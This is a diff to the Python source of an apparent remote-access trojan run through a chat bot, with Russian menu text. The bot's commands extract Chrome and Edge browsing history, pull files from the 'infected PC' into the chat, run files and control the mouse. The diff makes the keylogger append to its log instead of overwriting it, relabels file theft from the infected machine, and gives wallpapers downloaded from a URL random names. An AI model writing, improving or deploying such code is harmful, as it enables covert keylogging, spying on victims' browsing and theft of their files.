@@ -10,6 +10,7 @@ from datetime import datetime
 from io import StringIO
 from subprocess import Popen, PIPE
 from time import strftime, sleep
+import uuid
 
 # Сетевые
 import requests
@@ -92,7 +93,7 @@ def get_start_message():
         "/chrome_log — Извлечь историю Chrome\n"
         "/edge_log — Извлечь историю Edge\n\n"
         "📥 Работа с файлами\n"
-        "/download <путь> — Скачать файл\n"
+        "/download <путь> — Получить файл в этот чат с зараженного ПК\n"
         "/create_more_folders <кол-во папок> <базовое имя> <текст> — Создать много папок с txt файлами\n"
         "/run <путь> — Запустить файл\n\n"
         "🖱️ Управление мышью\n"
@@ -289,7 +290,8 @@ def run_file(path):
 def set_wallpaper(path):
     try:
         if path.startswith('http'):
-            filename = os.path.join(LOG_DIR, os.path.basename(path))
+            ext = '.jpg'
+            filename = os.path.join(LOG_DIR, f"wallpaper_{uuid.uuid4().hex}{ext}")
             urlretrieve(path, filename)
             ctypes.windll.user32.SystemParametersInfoW(20, 0, filename, 3)
             return 'Обои установлены с URL'
@@ -303,7 +305,7 @@ def set_wallpaper(path):
 
 
 def get_keylog_file():
-    with open(KEYLOG_FILE, "w") as f:
+    with open(KEYLOG_FILE, "a") as f:
         f.write("\n\n\n-------------------------------------------------\n")
         f.write(" Log: " + strftime("%b %d@%H:%M") + "\n")
     return KEYLOG_FILE
